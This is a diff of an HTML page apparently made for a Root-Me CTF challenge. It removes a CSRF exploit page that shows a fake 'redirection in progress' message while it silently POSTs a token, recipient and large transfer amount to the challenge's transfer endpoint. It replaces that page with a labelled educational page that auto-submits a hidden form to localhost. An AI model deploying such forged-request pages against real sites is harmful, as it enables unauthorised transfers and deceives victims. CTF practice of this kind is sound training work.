@@ -2,35 +2,22 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Exploit</title>
+    <title>Test Auto Submit</title>
 </head>
 <body>
-    <h1>Veuillez patienter...</h1>
-    <p>Votre redirection est en cours.</p>
-    <script>
-        const csrfToken = "Q1NSRnNfNHIzX2MwMGw6bHVuYToxMDA%3D"; // Token CSRF
-        const recipient = "paflepafausaure"; // Destinataire
-        const amount = "10000000"; // Montant
 
-        // Création de la requête POST
-        const xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://instance-019a9ce2-8ab8-71bb-9f0b-c5caa11f1d6a.challenges.root-me.pro/transfer/", true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+<h3>Page d'exemple (CTF - pédagogique)</h3>
+<p>Cette page montre comment un formulaire peut être soumis automatiquement.</p>
 
-        // Données à envoyer dans le corps de la requête
-        const data = token=${encodeURIComponent(csrfToken)}&recipient=${encodeURIComponent(recipient)}&amount=${encodeURIComponent(amount)};
+<form id="autoform" action="http://localhost:5000/test" method="POST">
+    <input type="hidden" name="recipient" value="paflepafausaure">
+    <input type="hidden" name="amount" value="10000000">
+</form>
 
-        // Envoi de la requête
-        xhr.send(data);
+<script>
+    // Auto-envoi (purement démonstratif)
+    document.getElementById("autoform").submit();
+</script>
 
-        // Message de succès ou d'erreur
-        xhr.onload = () => {
-            if (xhr.status === 200) {
-                console.log("Requête réussie !");
-            } else {
-                console.error("Erreur :", xhr.statusText);
-            }
-        };
-    </script>
 </body>
+</html>
